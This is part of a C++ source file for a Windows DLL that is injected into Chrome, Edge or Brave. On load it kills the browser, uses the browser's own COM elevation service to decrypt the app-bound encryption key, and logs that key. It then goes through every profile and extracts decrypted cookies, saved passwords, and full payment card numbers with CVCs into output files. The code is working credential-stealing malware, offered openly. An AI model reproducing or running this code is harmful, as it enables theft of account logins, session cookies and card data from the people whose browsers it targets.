                if (optPlainNum && !optPlainNum->empty())
                {
                    card_number_str.assign(reinterpret_cast<const char *>(optPlainNum->data()), optPlainNum->size());
                }
            }

            std::string cvc_value_str;
            auto cvc_iter = cvcMap.find(guid);
            if (cvc_iter != cvcMap.end())
            {
                const auto &cvc_blob_vec = cvc_iter->second;
                if (cvc_blob_vec.size() > (V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH) &&
                    std::string(reinterpret_cast<const char *>(cvc_blob_vec.data()), V20_PREFIX.length()) == V20_PREFIX)
                {
                    const uint8_t *iv2_ptr = cvc_blob_vec.data() + V20_PREFIX.length();
                    const uint8_t *tag2_ptr = cvc_blob_vec.data() + cvc_blob_vec.size() - GCM_TAG_LENGTH;
                    ULONG ct2_len = (ULONG)cvc_blob_vec.size() - (ULONG)V20_PREFIX.length() - (ULONG)GCM_IV_LENGTH - (ULONG)GCM_TAG_LENGTH;
                    const uint8_t *ct2_ptr = cvc_blob_vec.data() + V20_PREFIX.length() + GCM_IV_LENGTH;

                    auto optPlainCvc = DecryptGcm(aesKey, iv2_ptr, (ULONG)GCM_IV_LENGTH, ct2_ptr, ct2_len, tag2_ptr, (ULONG)GCM_TAG_LENGTH);
                    if (optPlainCvc && !optPlainCvc->empty())
                    {
                        cvc_value_str.assign(reinterpret_cast<const char *>(optPlainCvc->data()), optPlainCvc->size());
                    }
                }
            }

            if (!first_entry)
                out << ",\n";
            first_entry = false;
            out << "  {"
                << "\"name_on_card\":\"" << escapeJson(name_on_card ? name_on_card : "") << "\","
                << "\"expiration_month\":" << exp_month << ","
                << "\"expiration_year\":" << exp_year << ","
                << "\"card_number\":\"" << escapeJson(card_number_str) << "\","
                << "\"cvc\":\"" << escapeJson(cvc_value_str) << "\""
                << "}";
            extracted_count++;
        }
        if (rc_cc_step != SQLITE_DONE)
        {
            Logging::Log("[-] sqlite3_step error (credit cards): " + std::string(sqlite3_errmsg(conn.get())));
        }

        out << "\n]\n";
        if (extracted_count > 0)
        {
            Logging::Log("     [*] " + std::to_string(extracted_count) + " Payment methods extracted to " + outFilePath.u8string());
        }
    }
}

struct ThreadParams
{
    HMODULE hModule_dll;
};

DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
{
    ThreadParams *params = static_cast<ThreadParams *>(lpParam);
    HMODULE hModule_dll_copy = params ? params->hModule_dll : NULL;

    if (params)
    {
        delete params;
        params = nullptr;
    }

    fs::path finalOutputPath;
    try
    {
        fs::path configFilePathDll = fs::temp_directory_path() / SESSION_CONFIG_FILE_NAME;
        std::ifstream configFileDll(configFilePathDll);
        if (configFileDll)
        {
            std::string outputPathStr((std::istreambuf_iterator<char>(configFileDll)), std::istreambuf_iterator<char>());
            finalOutputPath = outputPathStr;
            configFileDll.close();
            std::error_code ec_remove_cfg;
            fs::remove(configFilePathDll, ec_remove_cfg);
            // Logging::Log("[+] Loaded output path from session config: " + finalOutputPath.u8string());
        }
        else
        {
            Logging::Log("[-] Session config file not found or unreadable: " + configFilePathDll.u8string() + ". Using default output path.");
            finalOutputPath = fs::current_path() / "output_dll_default";
        }
    }
    catch (const std::exception &e)
    {
        Logging::Log("[-] Exception reading session config: " + std::string(e.what()) + ". Using default output path.");
        finalOutputPath = fs::current_path() / "output_dll_default_exc";
    }
    std::error_code ec_base_output;
    if (!fs::exists(finalOutputPath))
    {
        if (!fs::create_directories(finalOutputPath, ec_base_output))
        {
            Logging::Log("[-] Failed to create base output directory: " + finalOutputPath.u8string() + ". Error: " + ec_base_output.message());
            try
            {
                finalOutputPath = fs::temp_directory_path() / "chrome_decrypt_fallback_output";
            }
            catch (...)
            {
                finalOutputPath = "chrome_decrypt_very_fallback_output";
            }
            Logging::Log("[!] Using fallback output directory: " + finalOutputPath.u8string());
            fs::create_directories(finalOutputPath, ec_base_output);
        }
    }

    std::string browserType_worker;
    char rawExePath[MAX_PATH] = {0};
    if (GetModuleFileNameA(NULL, rawExePath, MAX_PATH) == 0)
    {
        Logging::Log("[-] Failed to get current executable path. Error: " + std::to_string(GetLastError()));
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }
    fs::path currentProcessPath(rawExePath);
    std::string currentProcessName = currentProcessPath.filename().string();
    std::transform(currentProcessName.begin(), currentProcessName.end(), currentProcessName.begin(),
                   [](unsigned char c)
                   { return static_cast<char>(std::tolower(c)); });

    if (currentProcessName == "brave.exe")
        browserType_worker = "brave";
    else if (currentProcessName == "msedge.exe")
        browserType_worker = "edge";
    else if (currentProcessName == "chrome.exe")
        browserType_worker = "chrome";
    else
    {
        Logging::Log("[!] WorkerThread in unrecognized process: " + currentProcessName + ". Defaulting to 'chrome'.");
        browserType_worker = "chrome";
    }

    ChromeAppBound::KillBrowserProcesses(browserType_worker);
    Sleep(2000);

    if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
    {
        Logging::Log("[-] Failed to initialize COM. Error: " + std::to_string(GetLastError()));
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }
    Logging::Log("[+] COM library initialized (APARTMENTTHREADED).");
    struct ComInitializerGuard
    {
        ~ComInitializerGuard()
        {
            CoUninitialize();
            Logging::Log("[+] COM library uninitialized.");
        }
    } com_initializer_obj_thread;

    ChromeAppBound::BrowserConfig cfg;
    try
    {
        cfg = ChromeAppBound::GetBrowserConfig(browserType_worker);
    }
    catch (const std::exception &e)
    {
        Logging::Log("[-] Failed to get browser configuration: " + std::string(e.what()));
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }

    fs::path localStateFullPath;
    try
    {
        localStateFullPath = ChromeAppBound::GetLocalAppDataPath() / cfg.userDataRootSubPath / cfg.localStateFileName;
    }
    catch (const std::runtime_error &e)
    {
        Logging::Log("[-] Failed to construct Local State full path: " + std::string(e.what()));
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }

    auto optEncKey = ChromeAppBound::RetrieveEncryptedKeyFromLocalState(localStateFullPath);
    if (!optEncKey)
    {
        Logging::Log("[-] Failed to retrieve encrypted key from Local State.");
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }
    const std::vector<uint8_t> &encKeyBlob = *optEncKey;

    Logging::Log("[+] Encrypted key blob from Local State (" + std::to_string(encKeyBlob.size()) + " bytes).");
    if (!encKeyBlob.empty())
    {
        auto previewLen = std::min<size_t>(16, encKeyBlob.size());
        Logging::Log("[+] Encrypted key (preview): " + ChromeAppBound::BytesToHexString(encKeyBlob.data(), previewLen) + (encKeyBlob.size() > previewLen ? "..." : ""));
    }

    BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encKeyBlob.data()), (UINT)encKeyBlob.size());
    if (!bstrEncKey)
    {
        Logging::Log("[-] SysAllocStringByteLen failed for encrypted key.");
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }
    auto bstrEncKeyFreer = [](BSTR b)
    { if (b) SysFreeString(b); };
    std::unique_ptr<OLECHAR[], decltype(bstrEncKeyFreer)> bstrEncKeyPtr(bstrEncKey, bstrEncKeyFreer);

    BSTR bstrPlainKey = nullptr;
    DWORD lastComError = 0;
    HRESULT hr_decrypt = E_FAIL;

    Microsoft::WRL::ComPtr<IOriginalBaseElevator> chromeBraveElevator;
    Microsoft::WRL::ComPtr<IEdgeElevatorFinal> edgeElevator;
    std::ostringstream oss_hresult_hex;

    if (browserType_worker == "edge")
    {
        HRESULT hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, cfg.iid, &edgeElevator);
        if (SUCCEEDED(hr_create))
        {
            Logging::Log("[+] IElevator instance created for Edge.");
            HRESULT hr_proxy = CoSetProxyBlanket(edgeElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
            oss_hresult_hex.str("");
            oss_hresult_hex.clear();
            oss_hresult_hex << "0x" << std::hex << hr_proxy;
            if (FAILED(hr_proxy))
            {
                Logging::Log("[-] CoSetProxyBlanket failed for Edge: " + oss_hresult_hex.str());
            }
            else
            {
                Logging::Log("[+] Proxy blanket set for Edge.");
            }
            hr_decrypt = edgeElevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
        }
        else
        {
            oss_hresult_hex.str("");
            oss_hresult_hex.clear();
            oss_hresult_hex << "0x" << std::hex << hr_create;
            Logging::Log("[-] CoCreateInstance failed for Edge: " + oss_hresult_hex.str());
        }
    }
    else
    {
        HRESULT hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, cfg.iid, &chromeBraveElevator);
        if (SUCCEEDED(hr_create))
        {
            Logging::Log("[+] IElevator instance created for " + cfg.name + ".");
            HRESULT hr_proxy = CoSetProxyBlanket(chromeBraveElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
            oss_hresult_hex.str("");
            oss_hresult_hex.clear();
            oss_hresult_hex << "0x" << std::hex << hr_proxy;
            if (FAILED(hr_proxy))
            {
                Logging::Log("[-] CoSetProxyBlanket failed for " + cfg.name + ": " + oss_hresult_hex.str());
            }
            else
            {
                Logging::Log("[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING) for " + cfg.name + ".");
            }
            hr_decrypt = chromeBraveElevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
        }
        else
        {
            oss_hresult_hex.str("");
            oss_hresult_hex.clear();
            oss_hresult_hex << "0x" << std::hex << hr_create;
            Logging::Log("[-] CoCreateInstance failed for " + cfg.name + ": " + oss_hresult_hex.str());
        }
    }

    auto bstrPlainKeyFreer = [](BSTR b)
    { if (b) SysFreeString(b); };
    std::unique_ptr<OLECHAR[], decltype(bstrPlainKeyFreer)> bstrPlainKeyPtr(bstrPlainKey, bstrPlainKeyFreer);

    if (FAILED(hr_decrypt) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != ChromeAppBound::KEY_SIZE)
    {
        std::ostringstream err_decrypt;
        err_decrypt << "[-] IElevator -> DecryptData failed. HRESULT: 0x" << std::hex << hr_decrypt << ". Last COM Error: " << lastComError;
        if (bstrPlainKey)
            err_decrypt << ". Decrypted length: " << SysStringByteLen(bstrPlainKey) << " (expected " << ChromeAppBound::KEY_SIZE << ")";
        else
            err_decrypt << ". Decrypted BSTR is null.";
        Logging::Log(err_decrypt.str());
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }

    Logging::Log("[+] IElevator -> DecryptData successful. Decrypted key length: " + std::to_string(SysStringByteLen(bstrPlainKey)));
    std::vector<uint8_t> aesKey(ChromeAppBound::KEY_SIZE);
    memcpy(aesKey.data(), bstrPlainKey, ChromeAppBound::KEY_SIZE);

    std::string hexKey = ChromeAppBound::BytesToHexString(aesKey);
    ChromeAppBound::SaveKeyToFile(hexKey);
    Logging::Log("[+] Decrypted AES Key (hex): " + hexKey);

    fs::path userDataRoot;
    try
    {
        userDataRoot = ChromeAppBound::GetLocalAppDataPath() / cfg.userDataRootSubPath;
    }
    catch (const std::runtime_error &e)
    {
        Logging::Log("[-] Failed to get User Data Root path: " + std::string(e.what()));
        if (hModule_dll_copy)
            FreeLibraryAndExitThread(hModule_dll_copy, 1);
        return 1;
    }

    std::vector<fs::path> profilePaths;
    try
    {
        if (fs::exists(userDataRoot / "Default") && fs::is_directory(userDataRoot / "Default"))
        {
            profilePaths.push_back(userDataRoot / "Default");
            Logging::Log("[*] Found profile: Default");
        }
        for (const auto &entry : fs::directory_iterator(userDataRoot))
        {
            if (entry.is_directory())
            {
                std::string dirName = entry.path().filename().string();
                if (dirName.rfind("Profile ", 0) == 0)
                {
                    profilePaths.push_back(entry.path());
                    Logging::Log("[*] Found profile: " + dirName);
                }
            }
        }
    }
    catch (const fs::filesystem_error &e)
    {
        Logging::Log("[-] Filesystem error enumerating profiles in " + userDataRoot.u8string() + ": " + e.what());
    }

    if (profilePaths.empty())
    {
        bool dbs_in_root = false;
        try
        {
            dbs_in_root = fs::exists(userDataRoot / cfg.cookieDbRelativePath) ||
                          fs::exists(userDataRoot / cfg.loginDataDbRelativePath) ||
                          fs::exists(userDataRoot / cfg.webDataDbRelativePath);
        }
        catch (const fs::filesystem_error &e_check)
        {
            Logging::Log("[-] Filesystem error checking for DBs in UserDataRoot " + userDataRoot.u8string() + ": " + e_check.what());
        }

        if (dbs_in_root)
        {
            Logging::Log("[!] No standard profiles found, but DBs might be in UserDataRoot. Treating UserDataRoot as 'Default' profile.");
            profilePaths.push_back(userDataRoot);
        }
        else
        {
            Logging::Log("[-] No profile directories (Default or Profile *) found with recognizable DB structure in " + userDataRoot.u8string() + ". Cannot extract data.");
        }
    }

    for (const auto &profilePath : profilePaths)
    {
        std::string currentProfileName = profilePath.filename().string();
        if (profilePath == userDataRoot && currentProfileName != "Default" && currentProfileName.rfind("Profile ", 0) != 0)
        {
            currentProfileName = "Default_or_Root";
        }

        Logging::Log("[*] Processing profile: " + currentProfileName + " at path: " + profilePath.u8string());

        fs::path cookieDbFullPath = profilePath / cfg.cookieDbRelativePath;
        fs::path loginDbFullPath = profilePath / cfg.loginDataDbRelativePath;
        fs::path webDbFullPath = profilePath / cfg.webDataDbRelativePath;

        fs::path cookiesOutputFile = ChromeAppBound::GetOutputFilePath(finalOutputPath, cfg.name, currentProfileName, "cookies");
        fs::path passwordsOutputFile = ChromeAppBound::GetOutputFilePath(finalOutputPath, cfg.name, currentProfileName, "passwords");
        fs::path paymentsOutputFile = ChromeAppBound::GetOutputFilePath(finalOutputPath, cfg.name, currentProfileName, "payments");

        if (fs::exists(cookieDbFullPath))
        {
            ChromeAppBound::DecryptCookies(aesKey, cookieDbFullPath, cookiesOutputFile);
        }
        else
        {
            Logging::Log("[-] Cookies DB not found for profile '" + currentProfileName + "' at: " + cookieDbFullPath.u8string());
        }
        if (fs::exists(loginDbFullPath))
        {
            ChromeAppBound::DecryptPasswords(aesKey, loginDbFullPath, passwordsOutputFile);
        }
        else
        {
            Logging::Log("[-] Login Data DB not found for profile '" + currentProfileName + "' at: " + loginDbFullPath.u8string());
        }
        if (fs::exists(webDbFullPath))
        {
            ChromeAppBound::DecryptPaymentMethods(aesKey, webDbFullPath, paymentsOutputFile);
        }
        else
        {
            Logging::Log("[-] Web Data DB not found for profile '" + currentProfileName + "' at: " + webDbFullPath.u8string());
        }
    }

    Logging::Log("[*] Chrome data decryption process finished for " + cfg.name + ".");

    HANDLE hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, COMPLETION_EVENT_NAME_DLL);
    if (hEvent != NULL)
    {
        SetEvent(hEvent);
        CloseHandle(hEvent);
    }
    else
    {
        Logging::Log("[-] Could not open completion event to signal. Error: " + std::to_string(GetLastError()));
    }

    if (hModule_dll_copy)
    {
        Logging::Log("[*] Unloading DLL and exiting worker thread.");
        FreeLibraryAndExitThread(hModule_dll_copy, 0);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        ThreadParams *params = new (std::nothrow) ThreadParams();
        if (!params)
        {
            OutputDebugStringA("chrome_decrypt: DllMain: Failed to allocate ThreadParams.\n");
            return TRUE;
        }
        params->hModule_dll = hModule;

        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
        if (hThread == NULL)
        {
            OutputDebugStringA(("chrome_decrypt: DllMain: Failed to create worker thread. Error: " + std::to_string(GetLastError()) + "\n").c_str());
            delete params;
        }
        else
        {
            CloseHandle(hThread);
        }
    }
    return TRUE;
}